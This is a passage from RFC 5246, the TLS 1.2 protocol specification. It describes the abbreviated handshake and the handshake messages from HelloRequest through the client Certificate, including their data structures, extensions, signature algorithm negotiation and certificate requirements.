   be resumed.  The server then checks its session cache for a match.
   If a match is found, and the server is willing to re-establish the
   connection under the specified session state, it will send a
   ServerHello with the same Session ID value.  At this point, both
   client and server MUST send ChangeCipherSpec messages and proceed
   directly to Finished messages.  Once the re-establishment is
   complete, the client and server MAY begin to exchange application
   layer data.  (See flow chart below.)  If a Session ID match is not
   found, the server generates a new session ID, and the TLS client and
   server perform a full handshake.

Dierks & Rescorla           Standards Track                    [Page 36]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      Client                                                Server

      ClientHello                   -------->
                                                       ServerHello
                                                [ChangeCipherSpec]
                                    <--------             Finished
      [ChangeCipherSpec]
      Finished                      -------->
      Application Data              <------->     Application Data

          Figure 2.  Message flow for an abbreviated handshake

   The contents and significance of each message will be presented in
   detail in the following sections.

[7.4](#section-7.4).  Handshake Protocol

   The TLS Handshake Protocol is one of the defined higher-level clients
   of the TLS Record Protocol.  This protocol is used to negotiate the
   secure attributes of a session.  Handshake messages are supplied to
   the TLS record layer, where they are encapsulated within one or more
   TLSPlaintext structures, which are processed and transmitted as
   specified by the current active session state.

      enum {
          hello_request(0), client_hello(1), server_hello(2),
          certificate(11), server_key_exchange (12),
          certificate_request(13), server_hello_done(14),
          certificate_verify(15), client_key_exchange(16),
          finished(20), (255)
      } HandshakeType;

      struct {
          HandshakeType msg_type;    /* handshake type */
          uint24 length;             /* bytes in message */
          select (HandshakeType) {
              case hello_request:       HelloRequest;
              case client_hello:        ClientHello;
              case server_hello:        ServerHello;
              case certificate:         Certificate;
              case server_key_exchange: ServerKeyExchange;
              case certificate_request: CertificateRequest;
              case server_hello_done:   ServerHelloDone;
              case certificate_verify:  CertificateVerify;
              case client_key_exchange: ClientKeyExchange;
              case finished:            Finished;
          } body;
      } Handshake;

Dierks & Rescorla           Standards Track                    [Page 37]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   The handshake protocol messages are presented below in the order they
   MUST be sent; sending handshake messages in an unexpected order
   results in a fatal error.  Unneeded handshake messages can be
   omitted, however.  Note one exception to the ordering: the
   Certificate message is used twice in the handshake (from server to
   client, then from client to server), but described only in its first
   position.  The one message that is not bound by these ordering rules
   is the HelloRequest message, which can be sent at any time, but which
   SHOULD be ignored by the client if it arrives in the middle of a
   handshake.

   New handshake message types are assigned by IANA as described in
   [Section 12](#section-12).

[7.4.1](#section-7.4.1).  Hello Messages

   The hello phase messages are used to exchange security enhancement
   capabilities between the client and server.  When a new session
   begins, the record layer's connection state encryption, hash, and
   compression algorithms are initialized to null.  The current
   connection state is used for renegotiation messages.

[7.4.1.1](#section-7.4.1.1).  Hello Request

   When this message will be sent:

      The HelloRequest message MAY be sent by the server at any time.

   Meaning of this message:

      HelloRequest is a simple notification that the client should begin
      the negotiation process anew.  In response, the client should send
      a ClientHello message when convenient.  This message is not
      intended to establish which side is the client or server but
      merely to initiate a new negotiation.  Servers SHOULD NOT send a
      HelloRequest immediately upon the client's initial connection.  It
      is the client's job to send a ClientHello at that time.

      This message will be ignored by the client if the client is
      currently negotiating a session.  This message MAY be ignored by
      the client if it does not wish to renegotiate a session, or the
      client may, if it wishes, respond with a no_renegotiation alert.
      Since handshake messages are intended to have transmission
      precedence over application data, it is expected that the
      negotiation will begin before no more than a few records are
      received from the client.  If the server sends a HelloRequest but
      does not receive a ClientHello in response, it may close the
      connection with a fatal alert.

Dierks & Rescorla           Standards Track                    [Page 38]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      After sending a HelloRequest, servers SHOULD NOT repeat the
      request until the subsequent handshake negotiation is complete.

   Structure of this message:

      struct { } HelloRequest;

   This message MUST NOT be included in the message hashes that are
   maintained throughout the handshake and used in the Finished messages
   and the certificate verify message.

[7.4.1.2](#section-7.4.1.2).  Client Hello

   When this message will be sent:

      When a client first connects to a server, it is required to send
      the ClientHello as its first message.  The client can also send a
      ClientHello in response to a HelloRequest or on its own initiative
      in order to renegotiate the security parameters in an existing
      connection.

   Structure of this message:

      The ClientHello message includes a random structure, which is used
      later in the protocol.

         struct {
             uint32 gmt_unix_time;
             opaque random_bytes[28];
         } Random;

      gmt_unix_time
         The current time and date in standard UNIX 32-bit format
         (seconds since the midnight starting Jan 1, 1970, UTC, ignoring
         leap seconds) according to the sender's internal clock.  Clocks
         are not required to be set correctly by the basic TLS protocol;
         higher-level or application protocols may define additional
         requirements.  Note that, for historical reasons, the data
         element is named using GMT, the predecessor of the current
         worldwide time base, UTC.

      random_bytes
         28 bytes generated by a secure random number generator.

   The ClientHello message includes a variable-length session
   identifier.  If not empty, the value identifies a session between the
   same client and server whose security parameters the client wishes to
   reuse.  The session identifier MAY be from an earlier connection,

Dierks & Rescorla           Standards Track                    [Page 39]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   this connection, or from another currently active connection.  The
   second option is useful if the client only wishes to update the
   random structures and derived values of a connection, and the third
   option makes it possible to establish several independent secure
   connections without repeating the full handshake protocol.  These
   independent connections may occur sequentially or simultaneously; a
   SessionID becomes valid when the handshake negotiating it completes
   with the exchange of Finished messages and persists until it is
   removed due to aging or because a fatal error was encountered on a
   connection associated with the session.  The actual contents of the
   SessionID are defined by the server.

      opaque SessionID<0..32>;

   Warning: Because the SessionID is transmitted without encryption or
   immediate MAC protection, servers MUST NOT place confidential
   information in session identifiers or let the contents of fake
   session identifiers cause any breach of security.  (Note that the
   content of the handshake as a whole, including the SessionID, is
   protected by the Finished messages exchanged at the end of the
   handshake.)

   The cipher suite list, passed from the client to the server in the
   ClientHello message, contains the combinations of cryptographic
   algorithms supported by the client in order of the client's
   preference (favorite choice first).  Each cipher suite defines a key
   exchange algorithm, a bulk encryption algorithm (including secret key
   length), a MAC algorithm, and a PRF.  The server will select a cipher
   suite or, if no acceptable choices are presented, return a handshake
   failure alert and close the connection.  If the list contains cipher
   suites the server does not recognize, support, or wish to use, the
   server MUST ignore those cipher suites, and process the remaining
   ones as usual.

      uint8 CipherSuite[2];    /* Cryptographic suite selector */

   The ClientHello includes a list of compression algorithms supported
   by the client, ordered according to the client's preference.

      enum { null(0), (255) } CompressionMethod;

Dierks & Rescorla           Standards Track                    [Page 40]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      struct {
          ProtocolVersion client_version;
          Random random;
          SessionID session_id;
          CipherSuite cipher_suites<2..2^16-2>;
          CompressionMethod compression_methods<1..2^8-1>;
          select (extensions_present) {
              case false:
                  struct {};
              case true:
                  Extension extensions<0..2^16-1>;
          };
      } ClientHello;

   TLS allows extensions to follow the compression_methods field in an
   extensions block.  The presence of extensions can be detected by
   determining whether there are bytes following the compression_methods
   at the end of the ClientHello.  Note that this method of detecting
   optional data differs from the normal TLS method of having a
   variable-length field, but it is used for compatibility with TLS
   before extensions were defined.

   client_version
      The version of the TLS protocol by which the client wishes to
      communicate during this session.  This SHOULD be the latest
      (highest valued) version supported by the client.  For this
      version of the specification, the version will be 3.3 (see
      [Appendix E](#appendix-E) for details about backward compatibility).

   random
      A client-generated random structure.

   session_id
      The ID of a session the client wishes to use for this connection.
      This field is empty if no session_id is available, or if the
      client wishes to generate new security parameters.

   cipher_suites
      This is a list of the cryptographic options supported by the
      client, with the client's first preference first.  If the
      session_id field is not empty (implying a session resumption
      request), this vector MUST include at least the cipher_suite from
      that session.  Values are defined in [Appendix A.5](#appendix-A.5).

   compression_methods
      This is a list of the compression methods supported by the client,
      sorted by client preference.  If the session_id field is not empty
      (implying a session resumption request), it MUST include the

Dierks & Rescorla           Standards Track                    [Page 41]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      compression_method from that session.  This vector MUST contain,
      and all implementations MUST support, CompressionMethod.null.
      Thus, a client and server will always be able to agree on a
      compression method.

   extensions
      Clients MAY request extended functionality from servers by sending
      data in the extensions field.  The actual "Extension" format is
      defined in [Section 7.4.1.4](#section-7.4.1.4).

   In the event that a client requests additional functionality using
   extensions, and this functionality is not supplied by the server, the
   client MAY abort the handshake.  A server MUST accept ClientHello
   messages both with and without the extensions field, and (as for all
   other messages) it MUST check that the amount of data in the message
   precisely matches one of these formats; if not, then it MUST send a
   fatal "decode_error" alert.

   After sending the ClientHello message, the client waits for a
   ServerHello message.  Any handshake message returned by the server,
   except for a HelloRequest, is treated as a fatal error.

[7.4.1.3](#section-7.4.1.3).  Server Hello

   When this message will be sent:

      The server will send this message in response to a ClientHello
      message when it was able to find an acceptable set of algorithms.
      If it cannot find such a match, it will respond with a handshake
      failure alert.

   Structure of this message:

      struct {
          ProtocolVersion server_version;
          Random random;
          SessionID session_id;
          CipherSuite cipher_suite;
          CompressionMethod compression_method;
          select (extensions_present) {
              case false:
                  struct {};
              case true:
                  Extension extensions<0..2^16-1>;
          };
      } ServerHello;

Dierks & Rescorla           Standards Track                    [Page 42]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   The presence of extensions can be detected by determining whether
   there are bytes following the compression_method field at the end of
   the ServerHello.

   server_version
      This field will contain the lower of that suggested by the client
      in the client hello and the highest supported by the server.  For
      this version of the specification, the version is 3.3.  (See
      [Appendix E](#appendix-E) for details about backward compatibility.)

   random
      This structure is generated by the server and MUST be
      independently generated from the ClientHello.random.

   session_id
      This is the identity of the session corresponding to this
      connection.  If the ClientHello.session_id was non-empty, the
      server will look in its session cache for a match.  If a match is
      found and the server is willing to establish the new connection
      using the specified session state, the server will respond with
      the same value as was supplied by the client.  This indicates a
      resumed session and dictates that the parties must proceed
      directly to the Finished messages.  Otherwise, this field will
      contain a different value identifying the new session.  The server
      may return an empty session_id to indicate that the session will
      not be cached and therefore cannot be resumed.  If a session is
      resumed, it must be resumed using the same cipher suite it was
      originally negotiated with.  Note that there is no requirement
      that the server resume any session even if it had formerly
      provided a session_id.  Clients MUST be prepared to do a full
      negotiation -- including negotiating new cipher suites -- during
      any handshake.

   cipher_suite
      The single cipher suite selected by the server from the list in
      ClientHello.cipher_suites.  For resumed sessions, this field is
      the value from the state of the session being resumed.

   compression_method
      The single compression algorithm selected by the server from the
      list in ClientHello.compression_methods.  For resumed sessions,
      this field is the value from the resumed session state.

   extensions
      A list of extensions.  Note that only extensions offered by the
      client can appear in the server's list.

Dierks & Rescorla           Standards Track                    [Page 43]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[7.4.1.4](#section-7.4.1.4).  Hello Extensions

   The extension format is:

      struct {
          ExtensionType extension_type;
          opaque extension_data<0..2^16-1>;
      } Extension;

      enum {
          signature_algorithms(13), (65535)
      } ExtensionType;

   Here:

   -  "extension_type" identifies the particular extension type.

   -  "extension_data" contains information specific to the particular
      extension type.

   The initial set of extensions is defined in a companion document
   [[TLSEXT](#ref-TLSEXT)].  The list of extension types is maintained by IANA as
   described in [Section 12](#section-12).

   An extension type MUST NOT appear in the ServerHello unless the same
   extension type appeared in the corresponding ClientHello.  If a
   client receives an extension type in ServerHello that it did not
   request in the associated ClientHello, it MUST abort the handshake
   with an unsupported_extension fatal alert.

   Nonetheless, "server-oriented" extensions may be provided in the
   future within this framework.  Such an extension (say, of type x)
   would require the client to first send an extension of type x in a
   ClientHello with empty extension_data to indicate that it supports
   the extension type.  In this case, the client is offering the
   capability to understand the extension type, and the server is taking
   the client up on its offer.

   When multiple extensions of different types are present in the
   ClientHello or ServerHello messages, the extensions MAY appear in any
   order.  There MUST NOT be more than one extension of the same type.

   Finally, note that extensions can be sent both when starting a new
   session and when requesting session resumption.  Indeed, a client
   that requests session resumption does not in general know whether the
   server will accept this request, and therefore it SHOULD send the
   same extensions as it would send if it were not attempting
   resumption.

Dierks & Rescorla           Standards Track                    [Page 44]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   In general, the specification of each extension type needs to
   describe the effect of the extension both during full handshake and
   session resumption.  Most current TLS extensions are relevant only
   when a session is initiated: when an older session is resumed, the
   server does not process these extensions in Client Hello, and does
   not include them in Server Hello.  However, some extensions may
   specify different behavior during session resumption.

   There are subtle (and not so subtle) interactions that may occur in
   this protocol between new features and existing features which may
   result in a significant reduction in overall security.  The following
   considerations should be taken into account when designing new
   extensions:

   -  Some cases where a server does not agree to an extension are error
      conditions, and some are simply refusals to support particular
      features.  In general, error alerts should be used for the former,
      and a field in the server extension response for the latter.

   -  Extensions should, as far as possible, be designed to prevent any
      attack that forces use (or non-use) of a particular feature by
      manipulation of handshake messages.  This principle should be
      followed regardless of whether the feature is believed to cause a
      security problem.

      Often the fact that the extension fields are included in the
      inputs to the Finished message hashes will be sufficient, but
      extreme care is needed when the extension changes the meaning of
      messages sent in the handshake phase.  Designers and implementors
      should be aware of the fact that until the handshake has been
      authenticated, active attackers can modify messages and insert,
      remove, or replace extensions.

   -  It would be technically possible to use extensions to change major
      aspects of the design of TLS; for example the design of cipher
      suite negotiation.  This is not recommended; it would be more
      appropriate to define a new version of TLS -- particularly since
      the TLS handshake algorithms have specific protection against
      version rollback attacks based on the version number, and the
      possibility of version rollback should be a significant
      consideration in any major design change.

[7.4.1.4.1](#section-7.4.1.4.1).  Signature Algorithms

   The client uses the "signature_algorithms" extension to indicate to
   the server which signature/hash algorithm pairs may be used in
   digital signatures.  The "extension_data" field of this extension
   contains a "supported_signature_algorithms" value.

Dierks & Rescorla           Standards Track                    [Page 45]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      enum {
          none(0), md5(1), sha1(2), sha224(3), sha256(4), sha384(5),
          sha512(6), (255)
      } HashAlgorithm;

      enum { anonymous(0), rsa(1), dsa(2), ecdsa(3), (255) }
        SignatureAlgorithm;

      struct {
            HashAlgorithm hash;
            SignatureAlgorithm signature;
      } SignatureAndHashAlgorithm;

      SignatureAndHashAlgorithm
        supported_signature_algorithms<2..2^16-2>;

   Each SignatureAndHashAlgorithm value lists a single hash/signature
   pair that the client is willing to verify.  The values are indicated
   in descending order of preference.

   Note: Because not all signature algorithms and hash algorithms may be
   accepted by an implementation (e.g., DSA with SHA-1, but not
   SHA-256), algorithms here are listed in pairs.

   hash
      This field indicates the hash algorithm which may be used.  The
      values indicate support for unhashed data, MD5 [[MD5](#ref-MD5)], SHA-1,
      SHA-224, SHA-256, SHA-384, and SHA-512 [[SHS](#ref-SHS)], respectively.  The
      "none" value is provided for future extensibility, in case of a
      signature algorithm which does not require hashing before signing.

   signature
      This field indicates the signature algorithm that may be used.
      The values indicate anonymous signatures, RSASSA-PKCS1-v1_5
      [[PKCS1](#ref-PKCS1)] and DSA [[DSS](#ref-DSS)], and ECDSA [[ECDSA](#ref-ECDSA)], respectively.  The
      "anonymous" value is meaningless in this context but used in
      [Section 7.4.3](#section-7.4.3).  It MUST NOT appear in this extension.

   The semantics of this extension are somewhat complicated because the
   cipher suite indicates permissible signature algorithms but not hash
   algorithms.  Sections [7.4.2](#section-7.4.2) and [7.4.3](#section-7.4.3) describe the appropriate rules.

   If the client supports only the default hash and signature algorithms
   (listed in this section), it MAY omit the signature_algorithms
   extension.  If the client does not support the default algorithms, or
   supports other hash and signature algorithms (and it is willing to
   use them for verifying messages sent by the server, i.e., server
   certificates and server key exchange), it MUST send the

Dierks & Rescorla           Standards Track                    [Page 46]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   signature_algorithms extension, listing the algorithms it is willing
   to accept.

   If the client does not send the signature_algorithms extension, the
   server MUST do the following:

   -  If the negotiated key exchange algorithm is one of (RSA, DHE_RSA,
      DH_RSA, RSA_PSK, ECDH_RSA, ECDHE_RSA), behave as if client had
      sent the value {sha1,rsa}.

   -  If the negotiated key exchange algorithm is one of (DHE_DSS,
      DH_DSS), behave as if the client had sent the value {sha1,dsa}.

   -  If the negotiated key exchange algorithm is one of (ECDH_ECDSA,
      ECDHE_ECDSA), behave as if the client had sent value {sha1,ecdsa}.

   Note: this is a change from TLS 1.1 where there are no explicit
   rules, but as a practical matter one can assume that the peer
   supports MD5 and SHA-1.

   Note: this extension is not meaningful for TLS versions prior to 1.2.
   Clients MUST NOT offer it if they are offering prior versions.
   However, even if clients do offer it, the rules specified in [[TLSEXT](#ref-TLSEXT)]
   require servers to ignore extensions they do not understand.

   Servers MUST NOT send this extension.  TLS servers MUST support
   receiving this extension.

   When performing session resumption, this extension is not included in
   Server Hello, and the server ignores the extension in Client Hello
   (if present).

[7.4.2](#section-7.4.2).  Server Certificate

   When this message will be sent:

      The server MUST send a Certificate message whenever the agreed-
      upon key exchange method uses certificates for authentication
      (this includes all key exchange methods defined in this document
      except DH_anon).  This message will always immediately follow the
      ServerHello message.

   Meaning of this message:

      This message conveys the server's certificate chain to the client.

      The certificate MUST be appropriate for the negotiated cipher
      suite's key exchange algorithm and any negotiated extensions.

Dierks & Rescorla           Standards Track                    [Page 47]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Structure of this message:

      opaque ASN.1Cert<1..2^24-1>;

      struct {
          ASN.1Cert certificate_list<0..2^24-1>;
      } Certificate;

   certificate_list
      This is a sequence (chain) of certificates.  The sender's
      certificate MUST come first in the list.  Each following
      certificate MUST directly certify the one preceding it.  Because
      certificate validation requires that root keys be distributed
      independently, the self-signed certificate that specifies the root
      certificate authority MAY be omitted from the chain, under the
      assumption that the remote end must already possess it in order to
      validate it in any case.

   The same message type and structure will be used for the client's
   response to a certificate request message.  Note that a client MAY
   send no certificates if it does not have an appropriate certificate
   to send in response to the server's authentication request.

   Note: PKCS #7 [[PKCS7](#ref-PKCS7)] is not used as the format for the certificate
   vector because PKCS #6 [[PKCS6](#ref-PKCS6)] extended certificates are not used.
   Also, PKCS #7 defines a SET rather than a SEQUENCE, making the task
   of parsing the list more difficult.

   The following rules apply to the certificates sent by the server:

   -  The certificate type MUST be X.509v3, unless explicitly negotiated
      otherwise (e.g., [[TLSPGP](#ref-TLSPGP)]).

   -  The end entity certificate's public key (and associated
      restrictions) MUST be compatible with the selected key exchange
      algorithm.

      Key Exchange Alg.  Certificate Key Type

      RSA                RSA public key; the certificate MUST allow the
      RSA_PSK            key to be used for encryption (the
                         keyEncipherment bit MUST be set if the key
                         usage extension is present).
                         Note: RSA_PSK is defined in [[TLSPSK](#ref-TLSPSK)].

Dierks & Rescorla           Standards Track                    [Page 48]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      DHE_RSA            RSA public key; the certificate MUST allow the
      ECDHE_RSA          key to be used for signing (the
                         digitalSignature bit MUST be set if the key
                         usage extension is present) with the signature
                         scheme and hash algorithm that will be employed
                         in the server key exchange message.
                         Note: ECDHE_RSA is defined in [[TLSECC](#ref-TLSECC)].

      DHE_DSS            DSA public key; the certificate MUST allow the
                         key to be used for signing with the hash
                         algorithm that will be employed in the server
                         key exchange message.

      DH_DSS             Diffie-Hellman public key; the keyAgreement bit
      DH_RSA             MUST be set if the key usage extension is
                         present.

      ECDH_ECDSA         ECDH-capable public key; the public key MUST
      ECDH_RSA           use a curve and point format supported by the
                         client, as described in [[TLSECC](#ref-TLSECC)].

      ECDHE_ECDSA        ECDSA-capable public key; the certificate MUST
                         allow the key to be used for signing with the
                         hash algorithm that will be employed in the
                         server key exchange message.  The public key
                         MUST use a curve and point format supported by
                         the client, as described in  [[TLSECC](#ref-TLSECC)].

   -  The "server_name" and "trusted_ca_keys" extensions [[TLSEXT](#ref-TLSEXT)] are
      used to guide certificate selection.

   If the client provided a "signature_algorithms" extension, then all
   certificates provided by the server MUST be signed by a
   hash/signature algorithm pair that appears in that extension.  Note
   that this implies that a certificate containing a key for one
   signature algorithm MAY be signed using a different signature
   algorithm (for instance, an RSA key signed with a DSA key).  This is
   a departure from TLS 1.1, which required that the algorithms be the
   same.  Note that this also implies that the DH_DSS, DH_RSA,
   ECDH_ECDSA, and ECDH_RSA key exchange algorithms do not restrict the
   algorithm used to sign the certificate.  Fixed DH certificates MAY be
   signed with any hash/signature algorithm pair appearing in the
   extension.  The names DH_DSS, DH_RSA, ECDH_ECDSA, and ECDH_RSA are
   historical.

Dierks & Rescorla           Standards Track                    [Page 49]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   If the server has multiple certificates, it chooses one of them based
   on the above-mentioned criteria (in addition to other criteria, such
   as transport layer endpoint, local configuration and preferences,
   etc.).  If the server has a single certificate, it SHOULD attempt to
   validate that it meets these criteria.

   Note that there are certificates that use algorithms and/or algorithm
   combinations that cannot be currently used with TLS.  For example, a
   certificate with RSASSA-PSS signature key (id-RSASSA-PSS OID in
   SubjectPublicKeyInfo) cannot be used because TLS defines no
   corresponding signature algorithm.

   As cipher suites that specify new key exchange methods are specified
   for the TLS protocol, they will imply the certificate format and the
   required encoded keying information.

[7.4.3](#section-7.4.3).  Server Key Exchange Message

   When this message will be sent:

      This message will be sent immediately after the server Certificate
      message (or the ServerHello message, if this is an anonymous
      negotiation).

      The ServerKeyExchange message is sent by the server only when the
      server Certificate message (if sent) does not contain enough data
      to allow the client to exchange a premaster secret.  This is true
      for the following key exchange methods:

         DHE_DSS
         DHE_RSA
         DH_anon

      It is not legal to send the ServerKeyExchange message for the
      following key exchange methods:

         RSA
         DH_DSS
         DH_RSA

      Other key exchange algorithms, such as those defined in [[TLSECC](#ref-TLSECC)],
      MUST specify whether the ServerKeyExchange message is sent or not;
      and if the message is sent, its contents.

Dierks & Rescorla           Standards Track                    [Page 50]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Meaning of this message:

      This message conveys cryptographic information to allow the client
      to communicate the premaster secret: a Diffie-Hellman public key
      with which the client can complete a key exchange (with the result
      being the premaster secret) or a public key for some other
      algorithm.

   Structure of this message:

      enum { dhe_dss, dhe_rsa, dh_anon, rsa, dh_dss, dh_rsa
            /* may be extended, e.g., for ECDH -- see [[TLSECC](#ref-TLSECC)] */
           } KeyExchangeAlgorithm;

      struct {
          opaque dh_p<1..2^16-1>;
          opaque dh_g<1..2^16-1>;
          opaque dh_Ys<1..2^16-1>;
      } ServerDHParams;     /* Ephemeral DH parameters */

      dh_p
         The prime modulus used for the Diffie-Hellman operation.

      dh_g
         The generator used for the Diffie-Hellman operation.

      dh_Ys
         The server's Diffie-Hellman public value (g^X mod p).

Dierks & Rescorla           Standards Track                    [Page 51]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      struct {
          select (KeyExchangeAlgorithm) {
              case dh_anon:
                  ServerDHParams params;
              case dhe_dss:
              case dhe_rsa:
                  ServerDHParams params;
                  digitally-signed struct {
                      opaque client_random[32];
                      opaque server_random[32];
                      ServerDHParams params;
                  } signed_params;
              case rsa:
              case dh_dss:
              case dh_rsa:
                  struct {} ;
                 /* message is omitted for rsa, dh_dss, and dh_rsa */
              /* may be extended, e.g., for ECDH -- see [[TLSECC](#ref-TLSECC)] */
          };
      } ServerKeyExchange;

      params
         The server's key exchange parameters.

      signed_params
         For non-anonymous key exchanges, a signature over the server's
         key exchange parameters.

   If the client has offered the "signature_algorithms" extension, the
   signature algorithm and hash algorithm MUST be a pair listed in that
   extension.  Note that there is a possibility for inconsistencies
   here.  For instance, the client might offer DHE_DSS key exchange but
   omit any DSA pairs from its "signature_algorithms" extension.  In
   order to negotiate correctly, the server MUST check any candidate
   cipher suites against the "signature_algorithms" extension before
   selecting them.  This is somewhat inelegant but is a compromise
   designed to minimize changes to the original cipher suite design.

   In addition, the hash and signature algorithms MUST be compatible
   with the key in the server's end-entity certificate.  RSA keys MAY be
   used with any permitted hash algorithm, subject to restrictions in
   the certificate, if any.

   Because DSA signatures do not contain any secure indication of hash
   algorithm, there is a risk of hash substitution if multiple hashes
   may be used with any key.  Currently, DSA [[DSS](#ref-DSS)] may only be used with
   SHA-1.  Future revisions of DSS [[DSS-3](#ref-DSS-3)] are expected to allow the use
   of other digest algorithms with DSA, as well as guidance as to which

Dierks & Rescorla           Standards Track                    [Page 52]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   digest algorithms should be used with each key size.  In addition,
   future revisions of [[PKIX](#ref-PKIX)] may specify mechanisms for certificates to
   indicate which digest algorithms are to be used with DSA.

   As additional cipher suites are defined for TLS that include new key
   exchange algorithms, the server key exchange message will be sent if
   and only if the certificate type associated with the key exchange
   algorithm does not provide enough information for the client to
   exchange a premaster secret.

[7.4.4](#section-7.4.4).  Certificate Request

   When this message will be sent:

       A non-anonymous server can optionally request a certificate from
       the client, if appropriate for the selected cipher suite.  This
       message, if sent, will immediately follow the ServerKeyExchange
       message (if it is sent; otherwise, this message follows the
       server's Certificate message).

   Structure of this message:

      enum {
          rsa_sign(1), dss_sign(2), rsa_fixed_dh(3), dss_fixed_dh(4),
          rsa_ephemeral_dh_RESERVED(5), dss_ephemeral_dh_RESERVED(6),
          fortezza_dms_RESERVED(20), (255)
      } ClientCertificateType;

      opaque DistinguishedName<1..2^16-1>;

      struct {
          ClientCertificateType certificate_types<1..2^8-1>;
          SignatureAndHashAlgorithm
            supported_signature_algorithms<2^16-1>;
          DistinguishedName certificate_authorities<0..2^16-1>;
      } CertificateRequest;

   certificate_types
      A list of the types of certificate types that the client may
      offer.

         rsa_sign        a certificate containing an RSA key
         dss_sign        a certificate containing a DSA key
         rsa_fixed_dh    a certificate containing a static DH key.
         dss_fixed_dh    a certificate containing a static DH key

Dierks & Rescorla           Standards Track                    [Page 53]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   supported_signature_algorithms
      A list of the hash/signature algorithm pairs that the server is
      able to verify, listed in descending order of preference.

   certificate_authorities
      A list of the distinguished names [[X501](#ref-X501)] of acceptable
      certificate_authorities, represented in DER-encoded format.  These
      distinguished names may specify a desired distinguished name for a
      root CA or for a subordinate CA; thus, this message can be used to
      describe known roots as well as a desired authorization space.  If
      the certificate_authorities list is empty, then the client MAY
      send any certificate of the appropriate ClientCertificateType,
      unless there is some external arrangement to the contrary.

   The interaction of the certificate_types and
   supported_signature_algorithms fields is somewhat complicated.
   certificate_types has been present in TLS since SSLv3, but was
   somewhat underspecified.  Much of its functionality is superseded by
   supported_signature_algorithms.  The following rules apply:

   -  Any certificates provided by the client MUST be signed using a
      hash/signature algorithm pair found in
      supported_signature_algorithms.

   -  The end-entity certificate provided by the client MUST contain a
      key that is compatible with certificate_types.  If the key is a
      signature key, it MUST be usable with some hash/signature
      algorithm pair in supported_signature_algorithms.

   -  For historical reasons, the names of some client certificate types
      include the algorithm used to sign the certificate.  For example,
      in earlier versions of TLS, rsa_fixed_dh meant a certificate
      signed with RSA and containing a static DH key.  In TLS 1.2, this
      functionality has been obsoleted by the
      supported_signature_algorithms, and the certificate type no longer
      restricts the algorithm used to sign the certificate.  For
      example, if the server sends dss_fixed_dh certificate type and
      {{sha1, dsa}, {sha1, rsa}} signature types, the client MAY reply
      with a certificate containing a static DH key, signed with RSA-
      SHA1.

   New ClientCertificateType values are assigned by IANA as described in
   [Section 12](#section-12).

   Note: Values listed as RESERVED may not be used.  They were used in
   SSLv3.

Dierks & Rescorla           Standards Track                    [Page 54]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Note: It is a fatal handshake_failure alert for an anonymous server
   to request client authentication.

[7.4.5](#section-7.4.5).  Server Hello Done

   When this message will be sent:

      The ServerHelloDone message is sent by the server to indicate the
      end of the ServerHello and associated messages.  After sending
      this message, the server will wait for a client response.

   Meaning of this message:

      This message means that the server is done sending messages to
      support the key exchange, and the client can proceed with its
      phase of the key exchange.

      Upon receipt of the ServerHelloDone message, the client SHOULD
      verify that the server provided a valid certificate, if required,
      and check that the server hello parameters are acceptable.

   Structure of this message:

      struct { } ServerHelloDone;

[7.4.6](#section-7.4.6).  Client Certificate

   When this message will be sent:

      This is the first message the client can send after receiving a
      ServerHelloDone message.  This message is only sent if the server
      requests a certificate.  If no suitable certificate is available,
      the client MUST send a certificate message containing no
      certificates.  That is, the certificate_list structure has a
      length of zero.  If the client does not send any certificates, the
      server MAY at its discretion either continue the handshake without
      client authentication, or respond with a fatal handshake_failure
      alert.  Also, if some aspect of the certificate chain was
      unacceptable (e.g., it was not signed by a known, trusted CA), the
      server MAY at its discretion either continue the handshake
      (considering the client unauthenticated) or send a fatal alert.

      Client certificates are sent using the Certificate structure
      defined in [Section 7.4.2](#section-7.4.2).

Dierks & Rescorla           Standards Track                    [Page 55]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Meaning of this message:

      This message conveys the client's certificate chain to the server;
      the server will use it when verifying the CertificateVerify
      message (when the client authentication is based on signing) or
      calculating the premaster secret (for non-ephemeral Diffie-
      Hellman).  The certificate MUST be appropriate for the negotiated
      cipher suite's key exchange algorithm, and any negotiated
      extensions.

   In particular:

   -  The certificate type MUST be X.509v3, unless explicitly negotiated
      otherwise (e.g., [[TLSPGP](#ref-TLSPGP)]).

   -  The end-entity certificate's public key (and associated
      restrictions) has to be compatible with the certificate types
      listed in CertificateRequest:

      Client Cert. Type   Certificate Key Type

      rsa_sign            RSA public key; the certificate MUST allow the
                          key to be used for signing with the signature
                          scheme and hash algorithm that will be
                          employed in the certificate verify message.

      dss_sign            DSA public key; the certificate MUST allow the
                          key to be used for signing with the hash
                          algorithm that will be employed in the
                          certificate verify message.

      ecdsa_sign          ECDSA-capable public key; the certificate MUST
                          allow the key to be used for signing with the
                          hash algorithm that will be employed in the
                          certificate verify message; the public key
                          MUST use a curve and point format supported by
                          the server.

      rsa_fixed_dh        Diffie-Hellman public key; MUST use the same
      dss_fixed_dh        parameters as server's key.

      rsa_fixed_ecdh      ECDH-capable public key; MUST use the
      ecdsa_fixed_ecdh    same curve as the server's key, and MUST use a
                          point format supported by the server.

   -  If the certificate_authorities list in the certificate request
      message was non-empty, one of the certificates in the certificate
      chain SHOULD be issued by one of the listed CAs.

